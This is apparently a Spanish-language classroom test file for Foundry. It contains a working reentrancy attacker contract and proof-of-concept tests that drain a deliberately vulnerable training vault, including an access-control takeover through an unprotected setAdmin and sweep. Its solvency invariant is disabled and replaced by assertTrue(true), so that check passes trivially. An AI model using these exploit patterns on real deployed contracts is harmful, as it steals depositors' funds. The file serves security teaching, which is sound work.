// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/VaultVulnerable.sol";

// ---------------------------------------------------------------------------
// TALLER DE LA CLASE 7 — lo que falta lo escribis vos
// ---------------------------------------------------------------------------
// Hay tres cosas sin terminar: el contrato atacante y los dos tests que
// demuestran cada bug. Cada una tiene la consigna en su comentario.
//
// Los dos tests arrancan con `vm.skip(true)`, asi `forge test` los muestra como
// [SKIP] y no como falla. Cuando escribas uno, borra esa linea.
//
// Las consignas completas estan en ethereum/README.md, "Taller de la Clase 7".

// ---------------------------------------------------------------------------
// El contrato atacante
// ---------------------------------------------------------------------------
contract ReentrancyAttacker {
    VaultVulnerable public vault;
    uint256 public stake;      // lo que saca cada vuelta: su saldo en el libro
    uint256 public reentradas; // cuantas veces volvio a entrar (para leer el trace)

    constructor(VaultVulnerable _vault) {
        vault = _vault;
    }

    // Deposita `msg.value` y retira. `withdraw()` manda el ETH ANTES de poner
    // el saldo en 0, asi que cada `receive()` ve todavia `balances[this] == stake`
    // y puede volver a retirar lo mismo.
    function attack() external payable {
        stake = msg.value;
        reentradas = 0;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // Se ejecuta cada vez que el vault le manda ETH. Vuelve a entrar mientras al
    // vault le quede al menos `stake`: si entrara con menos, el `call` del vault
    // fallaria, revertiria con TransferFailed y se desharia TODO el ataque.
    receive() external payable {
        if (address(vault).balance >= stake) {
            reentradas++;
            vault.withdraw();
        }
    }
}

// ---------------------------------------------------------------------------
// PoC 1 — el robo de fondos
// ---------------------------------------------------------------------------
contract VaultVulnerableReentrancyTest is Test {
    VaultVulnerable vault;
    address victima1 = makeAddr("victima1");
    address victima2 = makeAddr("victima2");
    address attackerOwner = makeAddr("attackerOwner");

    function setUp() public {
        vault = new VaultVulnerable();
        // Dos victimas depositan 5 ETH cada una: el vault tiene 10.
        vm.deal(victima1, 5 ether);
        vm.deal(victima2, 5 ether);
        vm.prank(victima1);
        vault.deposit{value: 5 ether}();
        vm.prank(victima2);
        vault.deposit{value: 5 ether}();
    }

    // TODO: demostrar el robo. Con 1 ETH propio, `attackerOwner` lanza tu
    // ReentrancyAttacker. Verificar con asserts cuanto ETH queda en el vault y
    // cuanto tiene el atacante, y que el libro contable (`balanceOf`) sigue
    // diciendo que las victimas tienen su saldo.
    function test_Reentrancy_DrenaElVault() public {
        // Setup: dos víctimas depositaron 5 ETH cada una. El vault tiene 10.
        assertEq(address(vault).balance, 10 ether);
        ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
        vm.deal(attackerOwner, 1 ether);
        vm.prank(attackerOwner);
        attacker.attack{value: 1 ether}(); // invierte 1 ETH
        assertEq(address(vault).balance, 0); // vault vacío
        assertEq(address(attacker).balance, 11 ether); // 1 propio + 10 robados
        assertEq(attacker.reentradas(), 10);           // 1 withdraw + 10 anidados

        // El libro contable no se entera: sigue debiendo 10 ETH que ya no tiene.
        assertEq(vault.balanceOf(victima1), 5 ether);
        assertEq(vault.balanceOf(victima2), 5 ether);
        assertEq(vault.balanceOf(address(attacker)), 0);

        // Y las victimas ya no pueden retirar: el vault no tiene con que pagar.
        vm.prank(victima1);
        vm.expectRevert(VaultVulnerable.TransferFailed.selector);
        vault.withdraw();
    }
}

// ---------------------------------------------------------------------------
// PoC 2 — el otro bug
// ---------------------------------------------------------------------------
contract VaultVulnerableAccessControlTest is Test {
    VaultVulnerable vault;
    address deployer = makeAddr("deployer");
    address victima = makeAddr("victima");
    address atacante = makeAddr("atacante");

    function setUp() public {
        vm.prank(deployer);
        vault = new VaultVulnerable();   // deployer es admin
        vm.deal(victima, 8 ether);
        vm.prank(victima);
        vault.deposit{value: 8 ether}();
    }

    // TODO: demostrar que `atacante`, que no es el admin, puede quedarse con
    // los 8 ETH de la victima. Sin contrato atacante: alcanza con llamadas
    // desde su cuenta (`vm.prank`).
    function test_AccessControl_ExtranioSeQuedaConLosFondos() public {
        assertEq(vault.admin(), deployer);
        assertEq(atacante.balance, 0);

        // `setAdmin` no tiene control de acceso: cualquiera se nombra admin...
        vm.prank(atacante);
        vault.setAdmin(atacante);
        assertEq(vault.admin(), atacante);

        // ...y `sweep` le manda todo el ETH del contrato al admin.
        vm.prank(atacante);
        vault.sweep();

        assertEq(atacante.balance, 8 ether);
        assertEq(address(vault).balance, 0);
        assertEq(vault.balanceOf(victima), 8 ether);   // el libro le sigue debiendo
    }
}

// ---------------------------------------------------------------------------
// PoC 3 — el invariante de solvencia
// ---------------------------------------------------------------------------
// La misma propiedad de la Clase 6, la solvencia, con un handler que ademas de
// depositar puede disparar TU atacante. Es assertGe y no assertEq porque el
// deposito del atacante no se cuenta en `deposited`: un vault sano puede tener
// mas, nunca menos.
contract VulnerableHandler is Test {
    VaultVulnerable public vault;
    ReentrancyAttacker public attacker;
    uint256 public deposited;   // ETH legitimo que "deberia" estar en el vault

    constructor(VaultVulnerable _vault) {
        vault = _vault;
        attacker = new ReentrancyAttacker(_vault);
    }

    // Deposito legitimo de una victima simulada.
    function legitDeposit(uint256 amount) external {
        amount = bound(amount, 1 ether, 100 ether);
        vm.deal(address(this), amount);
        vault.deposit{value: amount}();
        deposited += amount;
    }

    // El atacante intenta su ataque. Solo procede si hay fondos.
    function runAttack(uint256 seed) external {
        uint256 stake = bound(seed, 1 ether, 10 ether);
        if (address(vault).balance == 0) return;
        vm.deal(address(this), stake);
        try attacker.attack{value: stake}() {
            // si tuvo exito, el atacante se llevo fondos que no contabilizamos
        } catch {}
    }
}

contract VaultVulnerableInvariantTest is Test {
    VaultVulnerable vault;
    VulnerableHandler handler;

    function setUp() public {
        vault = new VaultVulnerable();
        handler = new VulnerableHandler(vault);
        targetContract(address(handler));
    }

    /// @dev El assertGe esta comentado (con un assertTrue en su lugar) para que
    ///      la suite pase en verde. Cuando tu atacante funcione, descomentarlo y
    ///      correr `forge test --match-contract VaultVulnerableInvariantTest -vv`.
    ///      Volver a comentarlo al terminar.
    function invariant_solvency_DEMO() public view {
        // assertGe(
        //     address(vault).balance,
        //     handler.deposited(),
        //     "INSOLVENCIA: el vault tiene menos ETH del que deberia"
        // );
        assertTrue(true);
    }
}
